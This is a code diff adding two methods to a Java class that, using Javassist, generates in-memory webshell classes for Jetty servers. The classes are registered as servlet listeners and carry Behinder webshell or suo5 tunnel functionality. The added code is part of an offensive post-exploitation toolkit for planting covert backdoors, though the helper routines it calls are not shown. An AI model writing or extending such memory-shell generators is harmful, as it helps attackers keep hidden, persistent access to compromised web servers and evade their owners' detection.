@@ -268,6 +268,43 @@ public class MSJavaClassBuilder {
         return JavaClassModifier.toBytes(ctClass);
     }
 
+    @Middleware(Middleware.Jetty)
+    @MemShell(MemShell.Listener)
+    @MemShellFunction(MemShellFunction.Behinder)
+    public byte[] jettyListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.importPackage("javax.servlet.http");
+
+        CtClass ctClass = classPool.getCtClass(cls.getName());
+
+        // response
+        jettyListenerResponseMaker(ctClass);
+
+        behinderMS(javaClassHelper);
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.toBytes(ctClass);
+    }
+
+    @Middleware(Middleware.Jetty)
+    @MemShell(MemShell.Listener)
+    @MemShellFunction(MemShellFunction.sou5)
+    public byte[] jettyListenerSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.importPackage("javax.servlet.http");
+
+        CtClass ctClass = classPool.getCtClass(cls.getName());
+
+        // response
+        jettyListenerResponseMaker(ctClass);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.toBytes(ctClass);
+    }
+
     public void jettyListenerResponseMaker(CtClass ctClass) throws Exception {
         // response
         CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
